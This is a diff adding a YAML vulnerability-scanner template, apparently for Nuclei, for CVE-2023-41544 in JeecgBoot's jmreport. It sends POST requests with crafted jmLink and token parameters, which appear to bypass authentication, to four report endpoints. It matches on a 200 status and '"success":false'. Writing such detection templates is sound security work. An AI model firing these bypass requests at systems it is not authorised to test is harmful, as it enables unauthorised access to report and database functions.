@@ -1,0 +1,67 @@
+id: jimubaobiao-jmreport-loadTableData-info
+
+info:
+  name: jimubaobiao-jmreport-loadTableData-info
+  author: M9
+  severity: critical
+  tags: JeecgBoot, jmreport, loadTableData, RCE, CVE-2023-41544
+
+http:
+  - raw:
+      - |
+        POST /jmreport/loadTableData?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=1234056789 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json;charset=UTF-8
+        Connection: close
+
+        {}
+
+      - |
+        POST /jmreport/testConnection?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=1234056789 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json;charset=UTF-8
+        Connection: close
+
+        {}
+
+      - |
+        POST /jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=1234056789 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json;charset=UTF-8
+        Connection: close
+
+        {}
+
+      - |
+        POST /jmreport/show?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=1234056789 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json;charset=UTF-8
+        Connection: close
+
+        {} 
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":false'
+      - type: status
+        status:
+          - 200
